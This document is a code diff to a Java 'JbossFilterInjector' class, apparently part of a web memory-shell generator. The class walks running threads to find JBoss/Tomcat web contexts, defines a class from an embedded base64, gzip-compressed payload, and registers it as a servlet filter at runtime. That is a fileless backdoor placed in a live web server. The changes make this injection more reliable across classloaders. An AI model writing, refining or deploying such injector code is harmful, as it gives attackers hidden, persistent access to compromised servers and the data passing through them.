@@ -43,6 +43,10 @@ public class JbossFilterInjector {
         return "{{base64Str}}";
     }
 
+    /**
+     * org.apache.catalina.core.StandardContext
+     * /usr/local/jboss/server/default/deploy/jboss-web.deployer/jbossweb.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -52,23 +56,27 @@ public class JbossFilterInjector {
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    for (Object context : children.values()) {
-                        contexts.add(context);
-                    }
+                    contexts.addAll(children.values());
                 }
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
-            return Class.forName(getClassName(), false, classLoader).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
@@ -84,8 +92,9 @@ public class JbossFilterInjector {
             System.out.println("filter already injected");
             return;
         }
-        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
-        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Object filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
+        Object filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
@@ -97,20 +106,12 @@ public class JbossFilterInjector {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
 
-        Constructor<?>[] constructors;
-        constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
+        Constructor<?>[] constructors = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
         constructors[0].setAccessible(true);
-        try {
-            Object filterConfig = constructors[0].newInstance(context, filterDef);
-            Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
-            filterConfigs.put(getClassName(), filterConfig);
-            System.out.println("filter injected successfully");
-        } catch (Exception e) {
-            // 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
-            if (!(e.getCause() instanceof ClassNotFoundException)) {
-                throw e;
-            }
-        }
+        Object filterConfig = constructors[0].newInstance(context, filterDef);
+        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
+        filterConfigs.put(getClassName(), filterConfig);
+        System.out.println("filter injected successfully");
     }
 
     @SuppressWarnings("all")
@@ -147,7 +148,7 @@ public class JbossFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
             Method method = null;
@@ -167,8 +168,6 @@ public class JbossFilterInjector {
             }
             method.setAccessible(true);
             return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (NoSuchMethodException e) {
-            throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
         }
